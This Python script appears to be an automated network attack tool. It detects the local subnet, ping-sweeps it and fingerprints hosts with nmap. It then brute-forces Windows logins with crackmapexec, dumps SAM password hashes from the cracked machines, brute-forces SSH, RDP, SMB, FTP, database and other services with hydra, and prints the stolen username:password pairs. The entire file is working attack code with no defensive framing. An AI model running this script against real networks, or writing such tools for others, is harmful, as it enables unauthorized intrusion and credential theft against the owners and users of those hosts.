#!/usr/bin/env python3

import sys
import shutil
import subprocess as sp
import multiprocessing
import os
import re
import ipaddress
import nmap_parser
import login_brut
import sam_hashdump
import time


f = open('banner.txt', 'r')
file_contents = f.read()
print(file_contents)
f.close()

time.sleep(3)

# pre-load necessary tools

def install_pkg(pkg_name):
    if shutil.which(pkg_name) is None:
        sp.call(['sudo', 'apt-get', 'install', pkg_name])
    else:
        print('{pkg_name} already installed'.format(pkg_name=pkg_name))


print('installing nmap...')
install_pkg('nmap')

print('installing hydra...')
install_pkg('hydra')

print('installing crackmapexec...')
install_pkg('crackmapexec')


# network discovery phase: 1.1 retrieve ip range from local ip

print('retrieving local IP address...')

hostname_result = sp.run(['ip', 'route'], stdout=sp.PIPE)
hostname_output = hostname_result.stdout.decode('utf-8').split()

possible_ip_addresses = []
for x in (y for y in hostname_output if bool(re.match('^[0123456789./]+$', y)) and '/' in y):
    possible_ip_addresses.append(x)

if len(possible_ip_addresses) > 0:
    ip_range = possible_ip_addresses[0]
else:
    print('FATAL: could not determine ip range from local ip address')
    print('quitting...')
    sys.exit(1)

print('found ip: {ip_range}'.format(ip_range=ip_range))

ip_addresses = ['{0}'.format(ip_address) for ip_address in ipaddress.IPv4Network(ip_range)]


# network discovery phase: 1.2 ping sweep ip range

# https://stackoverflow.com/questions/21225464/fast-ping-sweep-in-python
def pinger(ip, live_hosts_queue):
    DEVNULL = open(os.devnull, 'w')
    try:
        sp.check_call(['ping', '-c1', '-b', ip], stdout=DEVNULL)
        print('found live host: {0}'.format(ip))
        live_hosts_queue.put(ip)
    except:
        pass


print('performing ping sweep...')

live_hosts_queue = multiprocessing.Queue()

pool = [multiprocessing.Process(target=pinger, args=(ip, live_hosts_queue)) for ip in ip_addresses]

for process in pool:
    process.start()

for process in pool:
    process.join()

live_hosts = []
while not live_hosts_queue.empty():
    ip = live_hosts_queue.get()
    live_hosts.append(ip)

print('found {0} live hosts on the network'.format(len(live_hosts)))
print('ping sweep complete')

if len(live_hosts) <= 0:
    print('no hosts on the network responded to ping')
    print('quitting...')
    sys.exit(1)


# network discovery phase: 1.3 fingerprint live hosts

print('fingerprinting live hosts...')


def fingerprinter(target, nmap_results_queue):
    nmap_result = sp.run(['nmap', '-Pn', '-O', target], universal_newlines = True, stdout=sp.PIPE)
    print('completed fingerprint of {target}'.format(target=target))
    nmap_output = '\n'.join(nmap_result.stdout.splitlines())
    nmap_results_queue.put((target, nmap_output))


nmap_results_queue = multiprocessing.Queue()

nmap_pool = [multiprocessing.Process(target=fingerprinter, args=(host, nmap_results_queue)) for host in live_hosts]

for process in nmap_pool:
    process.start()

for process in nmap_pool:
    process.join()


# network discovery phase: 1.4 parsing nmap output to find windows hosts

filepath = 'nmap_output.txt'
nmap_output_file = open(filepath, 'w')

nmap_outputs = {}
while not nmap_results_queue.empty():
    nmap_result = nmap_results_queue.get()
    host = nmap_result[0]
    output = nmap_result[1]
    nmap_outputs[host] = output
    nmap_output_file.write('{0}\n\n'.format(output))

nmap_output_file.close()

nmap_output_dict = nmap_parser.parse_nmap(filepath)

windows_hosts = []
for ip, data in nmap_output_dict.items():
    if 'OS Info' in data:
        if 'Manufacturing Company' in data['OS Info'] and 'Microsoft' in data['OS Info']['Manufacturing Company']:
            windows_hosts.append(ip)
        elif 'OS Environment' in data['OS Info'] and 'Windows' in data['OS Info']['OS Environment']:
            windows_hosts.append(ip)

host_credentials = {}

if len(windows_hosts) <= 0:
    print('did not find any windows hosts on the network')
else:
    print('found windows hosts: {0}'.format(', '.join(windows_hosts)))

    # cracking phase: 2.1 use crackmapexec to brute force windows logins

    print('attempting to crack windows logins with crackmapexec...')

    host_credentials.update(login_brut.crackmapexec(windows_hosts))

    if len(host_credentials) != 0:
        print('successfully cracked the username/password of at least 1 windows host!')

        # use crackmapexec to perform a hash dump on the new-found windows credentials

        print('retrieving SAM hashes on cracked hosts...')
        hashes = sam_hashdump.run(host_credentials)
        if not len(hashes):
            print('no SAM hashes retrieved')
        else:
            print(len(hashes), 'SAM hashes have been retrieved:')
            for h in hashes:
                print('+    ', h)


# cracking phase: 2.2 use hydra to brute force services

print('looking for hydra vulnerable ports...')

hydra_kibble = []
hydra_teeth = ['asterisk', 'afp', 'cisco', 'cisco-enable', 'cvs', 'firebird', 'ftp', 'ftps', 'http[s]-{head|get}',
              'http[s]-{get|post}-form', 'http-proxy', 'http-proxy-urlenum', 'icq', 'imap[s]', 'irc', 'ldap2[s]',
              'ldap3[-{cram|digest}md5][s]', 'mssql', 'mysql', 'ncp', 'nntp', 'oracle-listener', 'oracle-sid',
              'pcanywhere', 'pcnfs', 'pop3[s]', 'postgres', 'rdp', 'rexec', 'rlogin', 'rsh', 's7-300', 'sip', 'smb',
              'smtp[s]', 'smtp-enum', 'snmp', 'socks5', 'ssh', 'sshkey', 'svn', 'teamspeak', 'telnet[s]', 'vmauthd',
              'vnc', 'xmpp']

for ip, data in nmap_output_dict.items():
    for port, service in data.items():
        for tooth in (tooth for tooth in hydra_teeth if tooth in service):
            hydra_kibble.append([ip, port.split('/')[0], tooth])

print('found hydra vulnerable ports:')
print('    IP\t\t\t\tPORT\t\tSERVICE')
for target in hydra_kibble:
    print('    ' + str(target[0]) + '\t\t' + str(target[1]) + '\t\t\t' + str(target[2]))


print('attempting to crack service passwords with hydra...')

host_credentials.update(login_brut.hydra(hydra_kibble))


# done! display the cracked credentials!

print('DONE!')

if len(host_credentials) == 0:
    print('no credentials cracked')
else:
    print('passwords cracked:')
    print('     IP\t\t\t\t[PORT][SERVICE]\t\tUSERNAME:PASSWORD')
    for host in host_credentials.keys():
        creds = '{username}:{password}'.format(username=host_credentials[host][0], password=host_credentials[host][1])
        print('+    ' + host + '\t\t' + host_credentials[host][2] + '\t\t\t' + creds)
